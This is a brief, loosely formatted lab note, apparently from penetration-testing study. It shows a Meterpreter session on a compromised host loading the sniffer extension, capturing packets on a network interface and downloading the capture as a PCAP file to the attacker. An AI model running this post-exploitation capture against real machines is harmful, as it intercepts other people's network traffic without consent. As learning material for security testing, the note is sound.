# Sniffer

## Sniff traffic

`meterpreter > use sniffer`

\`\`\``Loading extension sniffer...Success.  
meterpreter >  
meterpreter > sniffer_interfaces`

`1 - 'VMware Accelerated AMD PCNet Adapter' ( type:0 mtu:1514 usable:true dhcp:false wifi:false )`

`meterpreter > sniffer_start 1  
[`_`] Capture started on interface 1 (50000 packet buffer)  
meterpreter > ping 10.11.1.7  
[-] Unknown command: ping.  
meterpreter > sniffer_sta  
sniffer_start sniffer_stats  
meterpreter > sniffer_sta sniffer_start sniffer_stats  
meterpreter > sniffer_sta sniffer_start sniffer_stats  
meterpreter > sniffer_stats 1 [`_`] Capture statistics for interface 1 packets: 8359 bytes: 909444 meterpreter > sniffer_dump 1 /tmp/all.cap [`_`] Flushing packet capture buffer for interface 1... [`_`] Flushed 8621 packets (1154664 bytes) [`_`] Downloaded 045% (524288/1154664)... [`_`] Downloaded 090% (1048576/1154664)... [`_`] Downloaded 100% (1154664/1154664)... [`_`] Download completed, converting to PCAP... [*] PCAP file written to /tmp/all.cap`\`\`\`

